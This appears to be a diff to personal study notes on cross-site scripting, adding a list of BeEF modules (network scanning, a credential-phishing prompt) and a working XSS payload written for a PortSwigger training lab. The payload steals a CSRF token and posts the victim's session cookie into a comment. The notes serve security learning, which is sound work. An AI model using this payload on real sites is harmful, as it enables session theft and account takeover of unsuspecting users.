@@ -1,3 +1,8 @@
+# BeEF XSS Good modules
+1. Network -> Ping Sweep
+2. Network -> Port Scanner
+3. Social Engineering -> Pretty Theft
+
 # notes:
 - It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other
 - Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers:
@@ -219,10 +224,29 @@ function handleResponse() {
 </script>
 ```
 
+## PortSwigger challenged: stealing cookies using CSRF (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+```html
+<script>
+var req = new XMLHttpRequest();
+req.open('get','/post?postId=10',false);
+req.send();
+var token = req.responseText.match(/name="csrf" value="(\w+)"/)[1];
+fetch('post/comment', {
+method: 'POST',
+mode: 'no-cors',
+dest: 'document',
+headers: {
+  "Content-Type" : "application/x-www-form-urlencoded",
+},
+body: "csrf=" + token + "&postId=10&comment=mycookie:"+ document.cookie + "&name=test&email=test%40test.com&website=http%3A%2F%2Ftest.com"
+});
+</script>
+```
+
 ---
 
 checkpoint
-https://portswigger.net/web-security/cross-site-scripting  
+https://portswigger.net/web-security/cross-site-scripting
    https://portswigger.net/web-security/cross-site-scripting/reflected  
       https://portswigger.net/web-security/cross-site-scripting/exploiting  
          https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf  
